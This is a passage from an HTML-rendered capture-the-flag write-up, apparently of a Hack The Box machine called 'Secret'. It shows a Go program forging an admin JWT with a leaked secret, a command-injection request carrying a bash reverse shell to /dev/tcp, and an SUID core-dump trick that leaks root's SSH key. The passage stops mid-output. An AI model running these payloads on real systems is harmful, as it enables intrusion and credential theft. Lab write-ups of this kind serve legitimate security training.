+</span></span><span class="line"><span class="cl">        <span class="kr">const</span> <span class="nx">getLogs</span> <span class="o">=</span> <span class="sb">`git log --oneline </span><span class="si">${</span><span class="nx">file</span><span class="si">}</span><span class="sb">`</span><span class="p">;</span> <span class="err">#</span> <span class="nx">command</span> <span class="nx">injection</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">exec</span><span class="p">(</span><span class="nx">getLogs</span><span class="p">,</span> <span class="p">(</span><span class="nx">err</span> <span class="p">,</span> <span class="nx">output</span><span class="p">)</span> <span class="p">=&gt;{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span><span class="p">(</span><span class="nx">err</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">                <span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mi">500</span><span class="p">).</span><span class="nx">send</span><span class="p">(</span><span class="nx">err</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                <span class="k">return</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">            <span class="nx">res</span><span class="p">.</span><span class="nx">json</span><span class="p">(</span><span class="nx">output</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">})</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">res</span><span class="p">.</span><span class="nx">json</span><span class="p">({</span>
+</span></span><span class="line"><span class="cl">            <span class="nx">role</span><span class="o">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="nx">role</span><span class="o">:</span> <span class="s2">&#34;you are normal user&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                <span class="nx">desc</span><span class="o">:</span> <span class="nx">userinfo</span><span class="p">.</span><span class="nx">name</span><span class="p">.</span><span class="nx">name</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="p">})</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">})</span>
+</span></span></code></pre></div><h2 id="foothold">Foothold</h2>
+<h3 id="shell-as-dasith">Shell as dasith</h3>
+<h4 id="forging-admin-token">Forging Admin Token</h4>
+<p>With the secret token obtained, I&rsquo;ll write a program to forge valid JWT token for user <code>theadmin</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="line"><span class="cl"><span class="kn">package</span> <span class="nx">main</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="p">(</span>
+</span></span><span class="line"><span class="cl">	<span class="s">&#34;fmt&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="nx">jwt</span> <span class="s">&#34;github.com/dgrijalva/jwt-go&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">func</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="nx">claims</span> <span class="o">:=</span> <span class="kd">struct</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="nx">ID</span>    <span class="kt">string</span> <span class="s">`json:&#34;_id,omitempty&#34;`</span>
+</span></span><span class="line"><span class="cl">		<span class="nx">Name</span>  <span class="kt">string</span> <span class="s">`json:&#34;name,omitempty&#34;`</span>
+</span></span><span class="line"><span class="cl">		<span class="nx">Email</span> <span class="kt">string</span> <span class="s">`json:&#34;email,omitempty&#34;`</span>
+</span></span><span class="line"><span class="cl">		<span class="nx">jwt</span><span class="p">.</span><span class="nx">StandardClaims</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}{</span>
+</span></span><span class="line"><span class="cl">		<span class="nx">ID</span><span class="p">:</span>    <span class="s">&#34;6114654d77f9a54e00f05777&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">		<span class="nx">Name</span><span class="p">:</span>  <span class="s">&#34;theadmin&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">		<span class="nx">Email</span><span class="p">:</span> <span class="s">&#34;root@dasith.works&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="nx">token</span> <span class="o">:=</span> <span class="nx">jwt</span><span class="p">.</span><span class="nf">NewWithClaims</span><span class="p">(</span><span class="nx">jwt</span><span class="p">.</span><span class="nx">SigningMethodHS256</span><span class="p">,</span> <span class="nx">claims</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="nx">secret</span> <span class="o">:=</span> <span class="s">&#34;gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE&#34;</span>
+</span></span><span class="line"><span class="cl">	<span class="nx">signedToken</span><span class="p">,</span> <span class="nx">_</span> <span class="o">:=</span> <span class="nx">token</span><span class="p">.</span><span class="nf">SignedString</span><span class="p">([]</span><span class="nb">byte</span><span class="p">(</span><span class="nx">secret</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">	<span class="nx">fmt</span><span class="p">.</span><span class="nf">Printf</span><span class="p">(</span><span class="s">&#34;%s&#34;</span><span class="p">,</span> <span class="nx">signedToken</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>I&rsquo;ll run the program to get the auth token.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «exploits» «10.10.14.28»
+</span></span><span class="line"><span class="cl">$ go run forge-jwt.go
+</span></span><span class="line"><span class="cl">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MTE0NjU0ZDc3ZjlhNTRlMDBmMDU3NzciLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6InJvb3RAZGFzaXRoLndvcmtzIn0.TKKattF_Exm2kXW4PQOo9jyrW0cMYuQkiQWP7DuhPn0
+</span></span></code></pre></div><p>Now I can verify if that token works by accessing the <code>/api/priv</code> route</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «exploits» «10.10.14.28»
+</span></span><span class="line"><span class="cl">$  curl -s -H <span class="s1">&#39;Auth-Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfa...[SNIP]...Pn0&#39;</span> <span class="s2">&#34;http://secret.htb:3000/api/priv&#34;</span> <span class="p">|</span> jq
+</span></span><span class="line"><span class="cl"><span class="o">{</span>
+</span></span><span class="line"><span class="cl">  <span class="s2">&#34;creds&#34;</span>: <span class="o">{</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;role&#34;</span>: <span class="s2">&#34;admin&#34;</span>,
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;username&#34;</span>: <span class="s2">&#34;theadmin&#34;</span>,
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;desc&#34;</span>: <span class="s2">&#34;welcome back admin,&#34;</span>
+</span></span><span class="line"><span class="cl">  <span class="o">}</span>
+</span></span><span class="line"><span class="cl"><span class="o">}</span>
+</span></span></code></pre></div><h4 id="command-injection">Command Injection</h4>
+<p>With admin token, I can access the <code>/api/logs</code> route.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="nx">router</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s1">&#39;/logs&#39;</span><span class="p">,</span> <span class="nx">verifytoken</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">file</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">query</span><span class="p">.</span><span class="nx">file</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">...[</span><span class="nx">SNIP</span><span class="p">]...</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">name</span> <span class="o">==</span> <span class="s1">&#39;theadmin&#39;</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">getLogs</span> <span class="o">=</span> <span class="sb">`git log --oneline </span><span class="si">${</span><span class="nx">file</span><span class="si">}</span><span class="sb">`</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nx">exec</span><span class="p">(</span><span class="nx">getLogs</span><span class="p">,</span> <span class="p">(</span><span class="nx">err</span> <span class="p">,</span> <span class="nx">output</span><span class="p">)</span> <span class="p">=&gt;{</span>
+</span></span><span class="line"><span class="cl">     <span class="k">if</span><span class="p">(</span><span class="nx">err</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mi">500</span><span class="p">).</span><span class="nx">send</span><span class="p">(</span><span class="nx">err</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">          <span class="k">return</span>
+</span></span><span class="line"><span class="cl">     <span class="p">}</span>
+</span></span><span class="line"><span class="cl">       <span class="nx">res</span><span class="p">.</span><span class="nx">json</span><span class="p">(</span><span class="nx">output</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">})</span>
+</span></span><span class="line"><span class="cl"><span class="p">...[</span><span class="nx">SNIP</span><span class="p">]...</span>
+</span></span></code></pre></div><p>This route takes one query: <code>file</code>, where its value then get passed into <code>getLogs</code> and eventually executed as OS command in the <code>exec()</code> function. Knowing this, I can inject OS command in the <code>file</code> query with <code>|</code> (pipe):</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «exploits» «10.10.14.28»
+</span></span><span class="line"><span class="cl">$ curl -s -H <span class="s1">&#39;Auth-Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfa...[SNIP]...Pn0&#39;</span> <span class="s2">&#34;http://secret.htb:3000/api/logs?file=%3E%2fdev%2fnull|uname%20-a&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="s2">&#34;Linux secret 5.4.0-89-generic #100-Ubuntu SMP Fri Sep 24 14:50:10 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux\n&#34;</span>
+</span></span></code></pre></div><p>And that worked.</p>
+<blockquote>
+<p>the <code>&gt;</code> and <code>/</code> symbols are URL encoded.</p>
+</blockquote>
+<h4 id="reverse-shell">Reverse Shell</h4>
+<p>This time I&rsquo;ll setup a netcat listener and send URL-encoded bash reverse shell</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «exploits» «10.10.14.28»
+</span></span><span class="line"><span class="cl">$ curl -s -H <span class="s1">&#39;Auth-Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfa...[SNIP]...Pn0&#39;</span> <span class="s2">&#34;http://secret.htb:3000/api/logs?file=%3E%2fdev%2fnull|bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.28%2F88%200%3E%261%22&#34;</span>
+</span></span></code></pre></div><p>On my listener:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «~» «10.10.14.28»
+</span></span><span class="line"><span class="cl">$ nc -nvlp <span class="m">88</span>
+</span></span><span class="line"><span class="cl">listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">88</span> ...
+</span></span><span class="line"><span class="cl">connect to <span class="o">[</span>10.10.14.28<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.11.120<span class="o">]</span> <span class="m">46050</span>
+</span></span><span class="line"><span class="cl">bash: cannot <span class="nb">set</span> terminal process group <span class="o">(</span>2131<span class="o">)</span>: Inappropriate ioctl <span class="k">for</span> device
+</span></span><span class="line"><span class="cl">bash: no job control in this shell
+</span></span><span class="line"><span class="cl">dasith@secret:~/local-web$ id
+</span></span><span class="line"><span class="cl">id
+</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>dasith<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>dasith<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1000<span class="o">(</span>dasith<span class="o">)</span>
+</span></span><span class="line"><span class="cl">dasith@secret:~/local-web$
+</span></span></code></pre></div><p>I&rsquo;ll upgrade my shell so it can be more interactive</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">dasith@secret:~/local-web$ script /dev/null -c bash
+</span></span><span class="line"><span class="cl">script /dev/null -c bash
+</span></span><span class="line"><span class="cl">Script started, file is /dev/null
+</span></span><span class="line"><span class="cl">dasith@secret:~/local-web$ <span class="nb">export</span> <span class="nv">TERM</span><span class="o">=</span>xterm
+</span></span><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">TERM</span><span class="o">=</span>xterm
+</span></span><span class="line"><span class="cl">dasith@secret:~/local-web$ ^Z
+</span></span><span class="line"><span class="cl"><span class="o">[</span>1<span class="o">]</span>  + <span class="m">7417</span> suspended  nc -nvlp <span class="m">88</span>
+</span></span><span class="line"><span class="cl">→ kali@kali «~» «10.10.14.28»
+</span></span><span class="line"><span class="cl">$ stty raw -echo<span class="p">;</span><span class="nb">fg</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>1<span class="o">]</span>  + <span class="m">7417</span> continued  nc -nvlp <span class="m">88</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">dasith@secret:~/local-web$
+</span></span></code></pre></div><p>The user flag is done here.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">dasith@secret:~$ cat user.txt
+</span></span><span class="line"><span class="cl">c95a3f...<span class="o">[</span>SNIP<span class="o">]</span>...
+</span></span></code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="shell-as-root">Shell as root</h3>
+<h4 id="enumeration-1">Enumeration</h4>
+<p>Doing a recursive search with the <code>find</code> command reveal a crash file</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">dasith@secret:/opt$ find / -type f -user dasith 2&gt;/dev/null <span class="p">|</span> grep -v <span class="s1">&#39;proc\|\.npm\|local-web&#39;</span>
+</span></span><span class="line"><span class="cl">/var/crash/_opt_count.1000.crash
+</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
+</span></span></code></pre></div><p>That naming lead me to <code>/opt</code>, where I find a C code, a binary, and a log file.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">dasith@secret:/$ ls /opt/
+</span></span><span class="line"><span class="cl">code.c  count  valgrind.log
+</span></span><span class="line"><span class="cl">dasith@secret:/$ <span class="nb">cd</span> /opt/
+</span></span><span class="line"><span class="cl">dasith@secret:/opt$ ls -la
+</span></span><span class="line"><span class="cl">total <span class="m">56</span>
+</span></span><span class="line"><span class="cl">drwxr-xr-x  <span class="m">2</span> root root  <span class="m">4096</span> Oct  <span class="m">7</span> 10:06 .
+</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">20</span> root root  <span class="m">4096</span> Oct  <span class="m">7</span> 15:01 ..
+</span></span><span class="line"><span class="cl">-rw-r--r--  <span class="m">1</span> root root  <span class="m">3736</span> Oct  <span class="m">7</span> 10:01 code.c
+</span></span><span class="line"><span class="cl">-rw-r--r--  <span class="m">1</span> root root <span class="m">16384</span> Oct  <span class="m">7</span> 10:01 .code.c.swp
+</span></span><span class="line"><span class="cl">-rwsr-xr-x  <span class="m">1</span> root root <span class="m">17824</span> Oct  <span class="m">7</span> 10:03 count
+</span></span><span class="line"><span class="cl">-rw-r--r--  <span class="m">1</span> root root  <span class="m">4622</span> Oct  <span class="m">7</span> 10:04 valgrind.log
+</span></span></code></pre></div><p>The binary drews my attention because it has SUID bit.</p>
+<p>When I run it, it asks for a file/directory and when it finishes, I&rsquo;m given with an option to save the results.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">dasith@secret:/opt$ ./count
+</span></span><span class="line"><span class="cl">Enter <span class="nb">source</span> file/directory name: /root/root.txt
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Total <span class="nv">characters</span> <span class="o">=</span> <span class="m">33</span>
+</span></span><span class="line"><span class="cl">Total <span class="nv">words</span>      <span class="o">=</span> <span class="m">2</span>
+</span></span><span class="line"><span class="cl">Total <span class="nv">lines</span>      <span class="o">=</span> <span class="m">2</span>
+</span></span><span class="line"><span class="cl">Save results a file? <span class="o">[</span>y/N<span class="o">]</span>: y
+</span></span><span class="line"><span class="cl">Path: /tmp/test
+</span></span><span class="line"><span class="cl">dasith@secret:/opt$ cat /tmp/test
+</span></span><span class="line"><span class="cl">Total <span class="nv">characters</span> <span class="o">=</span> <span class="m">33</span>
+</span></span><span class="line"><span class="cl">Total <span class="nv">words</span>      <span class="o">=</span> <span class="m">2</span>
+</span></span><span class="line"><span class="cl">Total <span class="nv">lines</span>      <span class="o">=</span> <span class="m">2</span>
+</span></span></code></pre></div><p>From here, I&rsquo;ll look into the C code.</p>
+<h4 id="source-code-analysis-1">Source Code Analysis</h4>
+<p>Since the rests isn&rsquo;t that important, I&rsquo;ll start from the main function.</p>
+<p>In the code snippet below, the first thing that this program do is ask the user for input and then it decides which functions to call: <code>dircount</code> if the input is a directory and <code>filecount</code> if the input is a file.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">path</span><span class="p">[</span><span class="mi">100</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">res</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">struct</span> <span class="n">stat</span> <span class="n">path_s</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">summary</span><span class="p">[</span><span class="mi">4096</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Enter source file/directory name: &#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">scanf</span><span class="p">(</span><span class="s">&#34;%99s&#34;</span><span class="p">,</span> <span class="n">path</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">getchar</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">stat</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">path_s</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nf">S_ISDIR</span><span class="p">(</span><span class="n">path_s</span><span class="p">.</span><span class="n">st_mode</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">dircount</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="n">summary</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">filecount</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="n">summary</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">...[</span><span class="n">SNIP</span><span class="p">]...</span>
+</span></span></code></pre></div><p>The next thing this program do is dropping the root privilege to normal user, and then it&rsquo;s forced to generate a <a href="https://en.wikipedia.org/wiki/Core_dump">core dump</a>. Lastly, it&rsquo;ll ask whether the user wants to save the result or not.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="p">...[</span><span class="n">SNIP</span><span class="p">]...</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// drop privs to limit file write
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">setuid</span><span class="p">(</span><span class="nf">getuid</span><span class="p">());</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// Enable coredump generation
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">prctl</span><span class="p">(</span><span class="n">PR_SET_DUMPABLE</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span> 
+</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Save results a file? [y/N]: &#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">res</span> <span class="o">=</span> <span class="nf">getchar</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">res</span> <span class="o">==</span> <span class="mi">121</span> <span class="o">||</span> <span class="n">res</span> <span class="o">==</span> <span class="mi">89</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Path: &#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">scanf</span><span class="p">(</span><span class="s">&#34;%99s&#34;</span><span class="p">,</span> <span class="n">path</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">FILE</span> <span class="o">*</span><span class="n">fp</span> <span class="o">=</span> <span class="nf">fopen</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="s">&#34;a&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">fp</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nf">fputs</span><span class="p">(</span><span class="n">summary</span><span class="p">,</span> <span class="n">fp</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="nf">fclose</span><span class="p">(</span><span class="n">fp</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Could not open %s for writing</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">path</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>The key here is that, with core dump enabled (<code> prctl(PR_SET_DUMPABLE, 1)</code>), when the program crashes, the memory state of this program will be recorded and dumped to a crash file. That file is typically used for diagnosing the program fault.</p>
+<h4 id="abuse-core-dump---force-crash">Abuse Core Dump - Force Crash</h4>
+<p>When I open a file like <code>/root/.ssh/id_rsa</code> in this program and if by accident it crashes, the content of that <code>id_rsa</code> will definitely got dumped into the crash file.</p>
+<p>Now the question is, how to intentionally crash this program?</p>
+<p>According to <a href="https://stackoverflow.com/questions/6561194/force-a-core-to-dump-from-an-active-normally-running-program-on-freebsd">this post</a> on StackOverFlow, sending <code>kill -11</code> can trigger a crash on a program, which eventually produces a core dump.</p>
+<p>First, I will open another sessions, so I have two in total. On the first session, I&rsquo;ll run the <code>count</code> program  and keep it running in the result section.</p>
+<pre tabindex="0"><code>dasith@secret:/tmp/$ /opt/count
+Enter source file/directory name: /root/.ssh/id_rsa
+
+Total characters = 2602
+Total words      = 45
+Total lines      = 39
+Save results a file? [y/N]: y
+Path: 
+</code></pre><p>Then on the other session, you guess it, I will send a kill signal to crash the program.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">dasith@secret:/opt$ <span class="nb">kill</span> -11 <span class="k">$(</span>pidof count<span class="k">)</span>
+</span></span></code></pre></div><p>It crashes</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">Enter <span class="nb">source</span> file/directory name: /root/.ssh/id_rsa
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Total <span class="nv">characters</span> <span class="o">=</span> <span class="m">2602</span>
+</span></span><span class="line"><span class="cl">Total <span class="nv">words</span>      <span class="o">=</span> <span class="m">45</span>
+</span></span><span class="line"><span class="cl">Total <span class="nv">lines</span>      <span class="o">=</span> <span class="m">39</span>
+</span></span><span class="line"><span class="cl">Save results a file? <span class="o">[</span>y/N<span class="o">]</span>: y
+</span></span><span class="line"><span class="cl">Path: Killed
+</span></span></code></pre></div><p>The crash file is generated under <code>/var/crash/</code>.</p>
+<pre tabindex="0"><code>dasith@secret:/tmp$ ls -l /var/crash/_opt_count.1000.crash
+-rw-r----- 1 dasith dasith 28717 Oct 31 08:39 /var/crash/_opt_count.1000.crash
+</code></pre><p>The crash file can be <a href="https://askubuntu.com/questions/434431/how-can-i-read-a-crash-file-from-var-crash">unpacked</a> into a separate files using the <code> apport-unpack</code> utility, which also installed in this machine.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">dasith@secret:/tmp/$ mkdir .syncrst <span class="o">&amp;&amp;</span> apport-unpack /var/crash/_opt_count.1000.crash .syncrst
+</span></span><span class="line"><span class="cl">dasith@secret:/tmp/$ ls -la .syncrst
+</span></span><span class="line"><span class="cl">total <span class="m">440</span>
+</span></span><span class="line"><span class="cl">drwxr-xr-x  <span class="m">2</span> dasith dasith   <span class="m">4096</span> Oct <span class="m">31</span> 08:43 .
+</span></span><span class="line"><span class="cl">drwxrwxrwt <span class="m">16</span> root   root     <span class="m">4096</span> Oct <span class="m">31</span> 08:25 ..
+</span></span><span class="line"><span class="cl">-rw-r--r--  <span class="m">1</span> dasith dasith      <span class="m">5</span> Oct <span class="m">31</span> 08:43 Architecture
+</span></span><span class="line"><span class="cl">-rw-r--r--  <span class="m">1</span> dasith dasith <span class="m">380928</span> Oct <span class="m">31</span> 08:43 CoreDump
+</span></span><span class="line"><span class="cl">-rw-r--r--  <span class="m">1</span> dasith dasith      <span class="m">1</span> Oct <span class="m">31</span> 08:43 CrashCounter
+</span></span><span class="line"><span class="cl">-rw-r--r--  <span class="m">1</span> dasith dasith     <span class="m">24</span> Oct <span class="m">31</span> 08:43 Date
+</span></span><span class="line"><span class="cl">-rw-r--r--  <span class="m">1</span> dasith dasith     <span class="m">12</span> Oct <span class="m">31</span> 08:43 DistroRelease
+</span></span><span class="line"><span class="cl">-rw-r--r--  <span class="m">1</span> dasith dasith     <span class="m">10</span> Oct <span class="m">31</span> 08:43 ExecutablePath
+</span></span><span class="line"><span class="cl">-rw-r--r--  <span class="m">1</span> dasith dasith     <span class="m">10</span> Oct <span class="m">31</span> 08:43 ExecutableTimestamp
+</span></span><span class="line"><span class="cl">-rw-r--r--  <span class="m">1</span> dasith dasith      <span class="m">5</span> Oct <span class="m">31</span> 08:43 ProblemType
+</span></span><span class="line"><span class="cl">-rw-r--r--  <span class="m">1</span> dasith dasith     <span class="m">10</span> Oct <span class="m">31</span> 08:43 ProcCmdline
+</span></span><span class="line"><span class="cl">-rw-r--r--  <span class="m">1</span> dasith dasith     <span class="m">10</span> Oct <span class="m">31</span> 08:43 ProcCwd
+</span></span><span class="line"><span class="cl">-rw-r--r--  <span class="m">1</span> dasith dasith     <span class="m">64</span> Oct <span class="m">31</span> 08:43 ProcEnviron
+</span></span><span class="line"><span class="cl">-rw-r--r--  <span class="m">1</span> dasith dasith   <span class="m">2144</span> Oct <span class="m">31</span> 08:43 ProcMaps
+</span></span><span class="line"><span class="cl">-rw-r--r--  <span class="m">1</span> dasith dasith   <span class="m">1343</span> Oct <span class="m">31</span> 08:43 ProcStatus
+</span></span><span class="line"><span class="cl">-rw-r--r--  <span class="m">1</span> dasith dasith      <span class="m">2</span> Oct <span class="m">31</span> 08:43 Signal
+</span></span><span class="line"><span class="cl">-rw-r--r--  <span class="m">1</span> dasith dasith     <span class="m">29</span> Oct <span class="m">31</span> 08:43 Uname
+</span></span><span class="line"><span class="cl">-rw-r--r--  <span class="m">1</span> dasith dasith      <span class="m">3</span> Oct <span class="m">31</span> 08:43 UserGroups
+</span></span></code></pre></div><p>The CoreDump file is the one that contains the <code>id_rsa</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">dasith@secret:/tmp/$ cat .syncrst/CoreDump
+</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
